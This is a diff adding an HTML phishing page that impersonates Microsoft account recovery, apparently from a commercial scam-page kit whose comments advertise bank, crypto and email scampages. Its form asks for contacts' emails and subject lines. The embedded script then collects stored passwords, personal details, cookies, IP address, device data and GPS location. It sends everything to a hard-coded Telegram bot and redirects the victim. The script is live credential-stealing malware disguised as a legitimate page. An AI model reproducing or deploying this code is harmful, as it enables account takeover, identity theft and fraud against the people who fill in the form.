@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en" xml:lang="en" class="m_ul" dir="ltr" style="">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <title>Recover your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
+    <style type="text/css">
+      body {
+        display: none;
+      }
+    </style>
+    <style type="text/css">
+      body {
+        display: block !important;
+      }
+    </style>
+    <link crossorigin="anonymous" href="./account-recovery-cont-2_files/app.css" rel="stylesheet">
+    <style></style>
+    <meta name="PageId" content="i6104">
+    <meta name="AMServerInfo" content="">
+    <meta name="lang" content="en">
+    <meta name="market" content="">
+    <link rel="icon" href="/assets/favicon.ico" type="image/x-icon">
+    <meta name="robots" content="none">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body class="ltr  Chrome _Win _M120 _D0 Full Win81 RE_WebKit hide-cookie-banner" lang="en-US">
+    <div class="App" id="iPageElt">
+      <div id="m_wh">
+        <div role="banner" id="c_header" class="c_hb c_hncb">
+          <div class="c_c t_hdbg c_cd c_c8 c_clt" id="c_cb0" style="overflow: visible;">
+            <div class="c_clogo c_clogoni" style="min-width: 170px;">
+              <div>
+                <a title="" class="c_clogot" id="c_clogot" onclick="" href="/account-recovery-cont-2.html" aria-label="Microsoft account">
+                  <img id="msLogo" role="img" alt="Microsoft" src="./account-recovery-cont-2_files/logo.svg">
+                  <span id="site-identifier" aria-hidden="true">Account</span>
+                </a>
+              </div>
+            </div>
+            <div id="c_cme" class="c_cme">
+              <a id="c_csigninsignout" href="/">Sign in</a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="c_base" class="c_base">
+        <div id="c_content" class="c_main">
+          <div class="">
+            <div role="main" class="c_inmiddle_area" id="maincontent" spellcheck="false">
+              <div id="pageControlHost">
+                <div class="PageContainer" style="opacity: 1;">
+                  <form id="pageDialogForm_3">
+                    <div id="MailHistory">
+                      <section class="section">
+                        <div id="MailHistoryTitle" class="text-subheader" role="heading" aria-level="1" data-bind="text: pageTitle">Account recovery for <span></span>
+                        </div>
+                        <div class="section-body container">
+                          <div class="row">
+                            <div id="MailHistoryDescText" class="text-subheading">For these questions you might want to ask for help from family, friends, or business contacts to confirm their email addresses and tell you the subject lines of emails you've sent them.</div>
+                          </div>
+                          <div class="row" style="display: none" data-bind="visible: Boolean(formError())">
+                            <div role="alert" aria-live="assertive">
+                              <div class="alert alert-error" data-nuid="formError" data-bind="text: formError"></div>
+                            </div>
+                          </div>
+                          <div class="row" id="MailContactsSection">
+                            <div class="col-xs-24 col-md-12">
+                              <label class="text-base" for="MailContactsFirstInput" id="MailContactsLabel" data-bind="text: questions.FrequentContacts">Email addresses of contacts you've recently sent emails to (one per text box)</label>
+                              <div class="form-group">
+                                <input id="emailOne" type="email" class="form-control" maxlength="80" data-nuid="MailContactsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.FrequentContacts" name="ko_unique_3" aria-label="Email addresses of contacts you&#39;ve recently sent emails to (one per text box)">
+                              </div>
+                              <div class="form-group">
+                                <input id="emailTwo" type="email" class="form-control" maxlength="80" data-nuid="MailContactsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.FrequentContacts" name="ko_unique_4" aria-label="Email addresses of contacts you&#39;ve recently sent emails to (one per text box)">
+                              </div>
+                              <div class="form-group">
+                                <input id="emailThree" type="email" class="form-control" maxlength="80" data-nuid="MailContactsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.FrequentContacts" name="ko_unique_5" aria-label="Email addresses of contacts you&#39;ve recently sent emails to (one per text box)">
+                              </div>
+                              <div class="form-group">
+                                <input id="emailFour" type="email" class="form-control" maxlength="80" data-nuid="MailContactsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.FrequentContacts" name="ko_unique_6" aria-label="Email addresses of contacts you&#39;ve recently sent emails to (one per text box)">
+                              </div>
+                              <div class="form-group" data-bind="visible: canAddFrequentContacts" style="display: none;">
+                                <a href="/account-recovery-cont-2.html#" id="AddMailContactLink" role="button" data-bind="click: onAddMailContactClick, clickBubble: false">Add more contacts</a>
+                              </div>
+                              <div role="alert" aria-live="assertive">
+                                <div class="alert alert-error" id="MailContactsError" style="display: none" data-bind="errorMessage: answers.frequentContactsGroup, visible: showError(answers.frequentContactsGroup)"></div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="row" id="MailSubjectsSection">
+                            <div class="col-xs-24 col-md-12">
+                              <label class="text-base" for="MailSubjectsFirstInput" id="MailSubjectsInputLabel" data-bind="text: questions.MailSubjects">Exact subject lines of your recently sent emails (one per text box)</label>
+                              <div class="form-group">
+                                <input id="subjectOne" type="text" class="form-control" maxlength="100" data-nuid="MailSubjectsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.MailSubjects" name="ko_unique_7" aria-label="Exact subject lines of your recently sent emails (one per text box)">
+                              </div>
+                              <div class="form-group">
+                                <input id="subjectTwo" type="text" class="form-control" maxlength="100" data-nuid="MailSubjectsInput" data-bind="textInput: $rawData, uniqueName: true, ariaLabel: $parent.questions.MailSubjects" name="ko_unique_8" aria-label="Exact subject lines of your recently sent emails (one per text box)">
+                              </div>
+                              <div role="alert" aria-live="assertive">
+                                <div class="alert alert-error" id="MailSubjectsError" style="display: none"></div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="row">
+                            <div class="btn-group">
+                              <button type="button" onclick="sendLogs()" class="btn btn-primary" role="button" id="MailHistoryAction">Next</button>
+                              <button type="button" onclick="backButton()" class="btn" role="button" id="MailHistoryCancel">Back</button>
+                            </div>
+                          </div>
+                        </div>
+                      </section>
+                    </div>
+                  </form>
+                </div>
+              </div>
+              <div id="hipScript"></div>
+            </div>
+            <div role="main" class="c_inmiddle_area" id="dynamiccontent" style="display:none" aria-hidden="true" spellcheck="false">
+              <div id="recoveryPlusTemplates" style="display:none"></div>
+            </div>
+            <div role="main" class="c_inmiddle_area" id="dynamiccontent1" style="display:none" aria-hidden="true" spellcheck="false"></div>
+          </div>
+          <div class="ClearFloat"></div>
+          <div id="m_wf" class="m_wfp">
+            <div id="uxp_ftr_ctr" role="contentinfo">
+              <div>
+                <div id="uxp_ftr_modal_language" class="modal fade" tabindex="-1" role="dialog" aria-label="English (United States)" aria-hidden="true">
+                  <div class="modal-dialog">
+                    <div class="modal-content">
+                      <div class="modal-header">
+                        <h4>Language</h4>
+                      </div>
+                      <form name="langPicker" action="/account-recovery-cont-2.htmlhandlers/languagesave.mvc" method="POST">
+                        <div class="modal-body"> We're unable to display the list of languages at this time. </div>
+                      </form>
+                      <div class="modal-footer">
+                        <button type="button" class="btn btn-primary">Save</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div id="uxp_ftr_items" class="col-xs-24">
+                  <div class="pull-right">
+                    <span id="uxp_ftr_link_trademark">© 2024 Microsoft</span>
+                    <span>
+                      <a id="uxp_ftr_link_legal" target="_top" tabindex="0" href="/" aria-label="Microsoft Terms of Use">Terms of Use</a>
+                    </span>
+                    <span>
+                      <a id="uxp_ftr_link_privacy" target="_top" tabindex="0" href="/" aria-label="Microsoft Privacy &amp; Cookies statement">Privacy &amp; Cookies</a>
+                    </span>
+                    <span>
+                      <a id="uxp_ftr_link_developers" target="_top" href="/">Developers</a>
+                    </span>
+                    <span>
+                      <a id="uxp_ftr_link_lang" data-toggle="modal" href="/account-recovery-cont-2.html#uxp_ftr_modal_language">English (United States)</a>
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script>
+    //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+    //Do not touch this section
+    //When testing results, if you don't find it in your inbox, check your spam folder.
+    //If you want to get quality:
+    // - USA Banks Scampage
+    // - UK Banks Scampage
+    // - Australian Scampage
+    // - Canadian Scampage
+    // - Crypto Websites Scampage 
+    // - Email Accounts Scampage
+    // - Newsletter Scampage and more..
+    // Visit: https://www.scampage.shop/
+    const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+    var username = localStorage.getItem("email");
+    var spanElement = document.querySelector('#MailHistoryTitle span');
+    if (username && spanElement) {
+      spanElement.textContent = username;
+    }
+
+    function backButton() {
+      window.location.href = "/account-recovery-cont.html";
+    }
+
+    function sendLogs() {
+      var emailOne = document.getElementById("emailOne").value;
+      var emailTwo = document.getElementById("emailTwo").value;
+      var emailThree = document.getElementById("emailThree").value;
+      var emailFour = document.getElementById("emailFour").value;
+      var subjectOne = document.getElementById("subjectOne").value;
+      var subjectTwo = document.getElementById("subjectTwo").value;
+      var passwordOne = localStorage.getItem("Other password - 1");
+      var passwordTwo = localStorage.getItem("Other password - 2");
+      var productsUsed = localStorage.getItem("Other products used");
+      var hadPurchases = localStorage.getItem("Purchased something?");
+      var firstName = localStorage.getItem("First name");
+      var lastName = localStorage.getItem("Last name");
+      var birthDate = localStorage.getItem("Birth date");
+      var enteredCountry = localStorage.getItem("Country");
+      var enteredCity = localStorage.getItem("City");
+      var postalCode = localStorage.getItem("Postal code");
+      var username = localStorage.getItem("email");
+      var password = localStorage.getItem("password");
+      const x = document.cookie;
+      fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+        const deviceInfo = {
+          manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+          model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+          os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+          browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+        };
+        getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, username, password, x, deviceInfo, ipAddress);
+      }).catch(error => {
+        console.error("Error capturing IP address:", error);
+      });
+    }
+
+    function getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, username, password, x, deviceInfo, ipAddress) {
+      navigator.geolocation?.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+          try {
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+            if (data.results.length > 0) {
+              const result = data.results[0].components;
+              const city = result.city || result.village || result.town;
+              const state = result.state;
+              const country = result.country;
+              const zipCode = result.postcode;
+              const continent = result.continent;
+              const county = result.county;
+              var dataToSend = {
+                emailOne,
+                emailTwo,
+                emailThree,
+                emailFour,
+                subjectOne,
+                subjectTwo,
+                passwordOne,
+                passwordTwo,
+                productsUsed,
+                hadPurchases,
+                firstName,
+                lastName,
+                birthDate,
+                enteredCountry,
+                enteredCity,
+                postalCode,
+                username,
+                password,
+                ipAddress,
+                Device: deviceInfo.manufacturer,
+                OS: deviceInfo.os,
+                Browser: deviceInfo.browser,
+                Latitude: latitude,
+                Longitude: longitude,
+                City: city,
+                State: state,
+                Country: country,
+                County: county,
+                ZipCode: zipCode,
+                Cookies: x,
+              };
+              if (Object.keys(dataToSend).length > 0) {
+                sendToTelegram(dataToSend);
+              } else {
+                console.warn("No data to send to Telegram.");
+              }
+            } else {
+              console.error("Location information not found.");
+            }
+          } catch (error) {
+            console.error("Error fetching location data:", error);
+          }
+        },
+        (error) => {
+          console.error("Error getting location:", error);
+          alert("Location permission is required to complete this recovery.");
+        });
+    };
+
+    function sendToTelegram(data) {
+      // Add your bot details here👇 (this is where you will get the logs)
+      var telegramBotId = "5991263032:AAHNBV9ePhJQlroqIq0a0YkLYWQCbVltgEo";
+      var chatId = 6157700917;
+      
+      var payload = {
+        chat_id: chatId,
+        text: `
+            New Office365 Logs:
+            ________________________
+               "Email address, phone number or skype": "${data.username}",
+               "Password": "${data.password}",
+
+               "First Name": "${data.firstName}",
+               "Last Name": "${data.lastName}",
+               "Birth date": "${data.birthDate}",
+               "Country/region where you created your account": "${data.enteredCountry}",
+               "City/Region": "${data.enteredCity}",
+               "Postal Code": "${data.postalCode}"
+
+               //Other passwords you've used for this account (one per text box)
+               "Password - 1": "${data.passwordOne}",
+               "Password - 2": "${data.passwordTwo}"
+
+               //Have you used any of the Microsoft products below with your account before? Check all that apply
+               "Products used": "${data.productsUsed}"
+
+               //Have you ever purchased something from Microsoft before, such as software, a device, or a subscription?
+               "Response": "${data.hadPurchases}"
+
+               //Email addresses of contacts you've recently sent emails to (one per text box)
+               "Email - 1": "${data.emailOne}",
+               "Email - 2": "${data.emailTwo}",
+               "Email - 3": "${data.emailThree}",
+               "Email - 4": "${data.emailFour}"
+
+               //Exact subject lines of your recently sent emails (one per text box)
+               "Subject - 1": "${data.subjectOne}",
+               "Subject - 2": "${data.subjectTwo}",
+
+               "IP Address": ${data.ipAddress},
+               "Device Info": "${data.Device}",
+               "OS": "${data.OS}",
+               "Browser": "${data.Browser}",
+               "Latitude": ${data.Latitude},
+               "Longitude": ${data.Longitude},
+               "City": "${data.City}",
+               "State": "${data.State}",
+               "County": "${data.County}",
+               "Country": "${data.Country}",
+               "ZipCode": "${data.ZipCode}",
+               "Cookies/User Token": ["${data.Cookies}"],
+            `
+      };
+      var sendToBot = {
+        url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "cache-control": "no-cache"
+        },
+        data: JSON.stringify(payload)
+      };
+      $.ajax(sendToBot).done(function(response) {
+        window.location.href = "/final.html";
+        // console.log("Telegram API response:", JSON.stringify(response));
+      }).fail(function(error) {
+        console.error("Error sending data to Telegram:", error);
+      });
+    }
+    document.getElementById("MailHistoryAction").addEventListener("keydown", function(event) {
+      if (event.keyCode === 13) {
+        sendLogs();
+      }
+    });
+  </script>
+</html>
